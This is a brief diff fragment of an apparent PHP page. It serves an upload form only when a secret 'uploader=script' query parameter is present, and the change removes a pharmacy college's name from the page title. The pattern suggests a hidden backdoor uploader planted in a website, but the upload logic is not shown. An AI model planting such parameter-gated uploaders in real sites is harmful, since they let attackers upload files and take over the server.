@@ -6,7 +6,7 @@ if (isset($_GET['uploader']) && $_GET['uploader'] == 'script') {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>SRI VENKATESWARA COLLEGE OF PHARMACY</title>
+        <title></title>
     </head>
     <body>
         <h2>Form Upload File</h2>';
